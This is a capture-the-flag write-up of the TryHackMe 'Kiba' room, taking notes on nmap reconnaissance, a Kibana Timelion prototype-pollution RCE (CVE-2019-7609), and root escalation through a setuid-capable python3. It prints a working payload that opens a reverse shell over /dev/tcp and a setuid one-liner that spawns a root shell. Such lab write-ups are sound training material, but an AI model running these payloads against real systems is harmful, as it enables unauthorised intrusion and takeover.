---
parent: "[[CTFs - THM]]"
---
```bash
# PLATFORM          . THM
# CTF NAME          . Kiba
# DESCRIPTION       . Identify the critical security flaw in the data visualization dashboard, that allows execute remote code execution.
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/kiba
```

```
sudo nmap -sSVC -T5 -p- 10.10.144.127 -oN kiba
```

```
PORT     STATE SERVICE      VERSION
22/tcp   open  ssh          OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9df8d157132481b6185d048ed2384f90 (RSA)
|   256 e1e67aa1a11cbe03d24e271b0d0aecb1 (ECDSA)
|_  256 2abae5c5fb51381745e7b154caa1a3fc (ED25519)

80/tcp   open  http         Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)

5044/tcp open  lxi-evntsvc?

5601/tcp open  esmagent?
|   GetRequest: 
|     HTTP/1.1 302 Found
|     location: /app/kibana
|     kbn-name: kibana
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
|     cache-control: no-cache
|     content-length: 0
|     connection: close
|     Date: Mon, 25 Dec 2023 14:35:17 GMT
|   HTTPOptions: 
|     HTTP/1.1 404 Not Found
|     kbn-name: kibana
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
|     content-type: application/json; charset=utf-8
|     cache-control: no-cache
|     content-length: 38
|     connection: close
|     Date: Mon, 25 Dec 2023 14:35:17 GMT
|_    {"statusCode":404,"error":"Not Found"}
```

- There's nothing useful on webserver running on port 80. 
- However, after the nmap scan, we see that kibana appears to be running on port `5601`.

- By checking the source code, we find out that the kibana version running is `6.5.4`. This can also be visible by navigating to `Management` dashboard.

- After some googling around, I found out that Kibana versions `3.0` - `5.6.14` and `6.0.0` - `6.6.0` are vulnerable to `cve-2019-7609`, which allows RCE by using a `prototype pollution` vulnerability in the `Timelion` feature of Kibana.

- After some googling around, I found the following payload for Timelion

```
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("sh -i >& /dev/tcp/IP/3131 0>&1");process.exit()//').props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

- However, in my case, this didn't work so I've used [this](https://github.com/LandGrey/CVE-2019-7609/) script instead.

- The first flag is located in `/home/kiba/user.txt`.

- Using `getcap -r /` we find one particularly useful capability set 

```
/home/kiba/.hackmeplease/python3 = cap_setuid+ep
```

- This can be leveraged to escalate privileges to root.

```
kiba@ubuntu:~$ /home/kiba/.hackmeplease/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

- The last flag is in `/root/root.txt`.